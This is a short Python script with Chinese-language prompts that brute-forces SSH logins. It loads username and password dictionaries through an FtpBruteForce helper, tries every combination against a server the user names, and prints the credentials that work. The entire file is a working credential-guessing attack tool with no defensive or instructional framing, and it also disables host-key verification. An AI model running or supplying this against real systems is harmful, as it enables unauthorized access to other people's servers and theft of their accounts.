from paramiko import SSHClient, AutoAddPolicy
from paramiko.ssh_exception import AuthenticationException, NoValidConnectionsError
from ftp_brute_force import FtpBruteForce

if __name__ == '__main__':
    server_address, server_port = input("请输入服务器地址和端口号（用空格隔开）：").split()
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy)  # 允许连接不在know_hosts文件中的主机
    fbf = FtpBruteForce(server_address=server_address, user_dict_path=r"user.dic", password_dict_path=r"password.dic")
    success_dict = dict()

    for username, password in fbf.load_dict():
            try:
                ssh_client.connect(username=username, password=password, hostname=server_address,
                                   port=int(server_port),
                                   banner_timeout=1)
            except TimeoutError:
                FtpBruteForce.display_message("连接超时或服务器不在线")
            except NoValidConnectionsError:
                FtpBruteForce.display_message("服务器在线，但服务未运行")
            except AuthenticationException:
                FtpBruteForce.display_message(f"{username} {password} 登录失败")
            except Exception:
                pass
            else:
                FtpBruteForce.display_message(f"{username} {password} 登录成功", color='green')
                success_dict[username] = password
            finally:
                ssh_client.close()

    if success_dict:
        print("登录成功的用户：")
        for key, value in success_dict.items():
            print(f"\033[32m{key} {value}\033[0m")
    else:
        pass

    ssh_client.close()  # 关闭连接
